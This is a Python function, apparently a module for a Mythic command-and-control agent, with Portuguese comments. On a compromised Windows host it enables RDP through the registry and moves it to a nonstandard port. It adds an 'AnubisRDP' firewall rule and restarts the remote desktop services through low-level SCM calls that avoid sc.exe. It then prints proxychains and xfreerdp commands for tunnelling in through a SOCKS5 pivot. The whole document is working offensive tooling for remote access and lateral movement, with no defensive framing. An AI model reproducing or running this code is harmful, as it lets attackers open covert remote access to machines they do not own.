    def rdp_ext(self, task_id, target="", port=6000, username="", password="",
                domain="", socks_port=7005):
        if platform.system() != 'Windows':
            return "rdp_ext: setup functions require Windows (registry + SCM)"

        import socket, subprocess, time, winreg
        import ctypes
        import ctypes.wintypes as W

        rdp_port = int(port)       if port       else 6000
        s_port   = int(socks_port) if socks_port else 7005

        # ── auto-detecta IP local se target não informado ─────────────────────
        if not target:
            try:
                target = socket.gethostbyname(socket.gethostname())
            except Exception:
                target = "127.0.0.1"

        results = []

        # ══════════════════════════════════════════════════════════════════════
        # 1. Habilita RDP no registry
        # ══════════════════════════════════════════════════════════════════════
        try:
            k = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"System\CurrentControlSet\Control\Terminal Server",
                0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
            )
            winreg.SetValueEx(k, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(k)
            results.append("[+] RDP habilitado (fDenyTSConnections = 0)")
        except Exception as e:
            results.append("[-] Habilitar RDP: {}".format(e))

        # ══════════════════════════════════════════════════════════════════════
        # 2. Lê porta atual e altera para rdp_port
        # ══════════════════════════════════════════════════════════════════════
        REG_RDP_TCP = r"System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
        try:
            k = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE, REG_RDP_TCP,
                0, winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
            )
            old_port, _ = winreg.QueryValueEx(k, "PortNumber")
            winreg.SetValueEx(k, "PortNumber", 0, winreg.REG_DWORD, rdp_port)
            winreg.CloseKey(k)
            if old_port == rdp_port:
                results.append("[*] Porta RDP já era {} (sem alteração)".format(rdp_port))
            else:
                results.append("[+] Porta RDP: {} → {} (registro atualizado)".format(
                    old_port, rdp_port))
        except Exception as e:
            results.append("[-] Alterar porta RDP: {}".format(e))

        # ══════════════════════════════════════════════════════════════════════
        # 3. Windows Firewall — adiciona regra inbound para nova porta
        #    (remove regra anterior com mesmo nome antes de adicionar)
        # ══════════════════════════════════════════════════════════════════════
        rule_name = "AnubisRDP-{}".format(rdp_port)
        try:
            # remove se já existir (idempotente)
            subprocess.run(
                ["netsh", "advfirewall", "firewall", "delete", "rule",
                 "name={}".format(rule_name)],
                capture_output=True, timeout=10
            )
            r = subprocess.run(
                ["netsh", "advfirewall", "firewall", "add", "rule",
                 "name={}".format(rule_name),
                 "dir=in", "action=allow", "protocol=TCP",
                 "localport={}".format(rdp_port)],
                capture_output=True, timeout=10
            )
            if r.returncode == 0:
                results.append("[+] Firewall: regra inbound TCP/{} adicionada ({})".format(
                    rdp_port, rule_name))
            else:
                out = (r.stdout + r.stderr).decode(errors='ignore').strip()
                results.append("[-] Firewall: {} (rc={})".format(out, r.returncode))
        except Exception as e:
            results.append("[-] Firewall: {}".format(e))

        # ══════════════════════════════════════════════════════════════════════
        # 4. Reinicia SessionEnv + TermService via SCM (ctypes — sem sc.exe)
        #    Ordem: stop SessionEnv → stop TermService → start TermService → start SessionEnv
        #    SessionEnv (Remote Desktop Configuration) gerencia o listener RDP-Tcp
        #    e precisa reiniciar para que o port change no registry seja aplicado.
        # ══════════════════════════════════════════════════════════════════════
        try:
            advapi32 = ctypes.windll.advapi32

            SC_MANAGER_CONNECT   = 0x0001
            SERVICE_STOP         = 0x0020
            SERVICE_START        = 0x0010
            SERVICE_QUERY_STATUS = 0x0004
            SERVICE_CONTROL_STOP = 0x0001
            SERVICE_STOPPED      = 0x00000001
            SERVICE_RUNNING      = 0x00000004
            SVC_ACCESS           = SERVICE_STOP | SERVICE_START | SERVICE_QUERY_STATUS

            class SERVICE_STATUS(ctypes.Structure):
                _fields_ = [
                    ("dwServiceType",             W.DWORD),
                    ("dwCurrentState",            W.DWORD),
                    ("dwControlsAccepted",        W.DWORD),
                    ("dwWin32ExitCode",           W.DWORD),
                    ("dwServiceSpecificExitCode", W.DWORD),
                    ("dwCheckPoint",              W.DWORD),
                    ("dwWaitHint",                W.DWORD),
                ]

            h_scm = advapi32.OpenSCManagerW(None, None, SC_MANAGER_CONNECT)

            def _stop_svc(name):
                h = advapi32.OpenServiceW(h_scm, name, SVC_ACCESS)
                ss = SERVICE_STATUS()
                advapi32.ControlService(h, SERVICE_CONTROL_STOP, ctypes.byref(ss))
                for _ in range(15):
                    advapi32.QueryServiceStatus(h, ctypes.byref(ss))
                    if ss.dwCurrentState == SERVICE_STOPPED:
                        break
                    time.sleep(1)
                advapi32.CloseServiceHandle(h)

            def _start_svc(name):
                h = advapi32.OpenServiceW(h_scm, name, SVC_ACCESS)
                ss = SERVICE_STATUS()
                advapi32.StartServiceW(h, 0, None)
                for _ in range(15):
                    advapi32.QueryServiceStatus(h, ctypes.byref(ss))
                    if ss.dwCurrentState == SERVICE_RUNNING:
                        break
                    time.sleep(1)
                advapi32.CloseServiceHandle(h)
                return ss.dwCurrentState

            _stop_svc("SessionEnv")   # para o listener RDP-Tcp primeiro
            _stop_svc("TermService")
            ts_state = _start_svc("TermService")
            se_state = _start_svc("SessionEnv")  # relê porta do registry ao subir

            advapi32.CloseServiceHandle(h_scm)

            if ts_state == SERVICE_RUNNING and se_state == SERVICE_RUNNING:
                results.append("[+] TermService + SessionEnv reiniciados e ativos na porta {}".format(rdp_port))
            else:
                results.append("[!] Restart: TermService={} SessionEnv={} (aguarde alguns segundos)".format(
                    ts_state, se_state))
        except Exception as e:
            results.append("[-] TermService/SessionEnv restart: {}".format(e))

        # ══════════════════════════════════════════════════════════════════════
        # 5. TCP probe (aguarda 5s para o listener RDP-Tcp subir após SessionEnv)
        # ══════════════════════════════════════════════════════════════════════
        time.sleep(5)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            sock.connect((target, rdp_port))
            sock.close()
            reachable = True
        except Exception as e:
            reachable = False
            probe_err = str(e)

        if not reachable:
            results.append((
                "\n[-] TCP {}:{} — UNREACHABLE\n"
                "    Erro : {}\n"
                "[!] TermService pode ainda estar subindo — aguarde 10s e tente:\n"
                "    rdp_ext {} {} (sem re-configurar)"
            ).format(target, rdp_port, probe_err, target, rdp_port))
            return "\n".join(results)

        results.append("\n[+] TCP {}:{} — REACHABLE".format(target, rdp_port))
        results.append("[+] SOCKS5 iniciado na porta {} do servidor Mythic\n".format(s_port))

        # ══════════════════════════════════════════════════════════════════════
        # 6. Monta comandos de conexão
        # ══════════════════════════════════════════════════════════════════════
        user_display = "{}\\{}".format(domain, username) if domain and username else (username or "")

        # rdesktop
        rd_creds = ""
        if domain and username:
            rd_creds += " -d '{}' -u '{}'".format(domain, username)
        elif username:
            rd_creds += " -u '{}'".format(username)
        if password:
            rd_creds += " -p '{}'".format(password)

        # xfreerdp
        xf_creds = ""
        if username:
            xf_creds += " /u:{}".format(username)
        if domain:
            xf_creds += " /d:{}".format(domain)
        if password:
            xf_creds += " /p:'{}'".format(password)

        xf_target = "/v:{}:{}".format(target, rdp_port)

        results.append(
            "╔══ PROXYCHAINS CONFIG ═════════════════════════════════════════╗\n"
            "║  [ProxyList]\n"
            "║  socks5  127.0.0.1  {}\n"
            "╚═══════════════════════════════════════════════════════════════╝\n"
            "\n── rdesktop ──────────────────────────────────────────────────────\n"
            "  proxychains rdesktop {} -P {}{} -g 1920x1080 -K\n"
            "\n── xfreerdp (proxychains) ────────────────────────────────────────\n"
            "  proxychains xfreerdp {} {} /cert-ignore +clipboard /dynamic-resolution\n"
            "\n── xfreerdp (SOCKS5 nativo) ──────────────────────────────────────\n"
            "  xfreerdp /proxy:socks5://127.0.0.1:{} {} {} /cert-ignore +clipboard /dynamic-resolution\n"
            "\n[*] Usuário : {}\n"
            "[*] Alvo    : {}:{}"
        ).format(
            s_port,
            target, rdp_port, rd_creds,
            xf_target, xf_creds,
            s_port, xf_target, xf_creds,
            user_display or "(não fornecido)",
            target, rdp_port
        )

        return "\n".join(results)
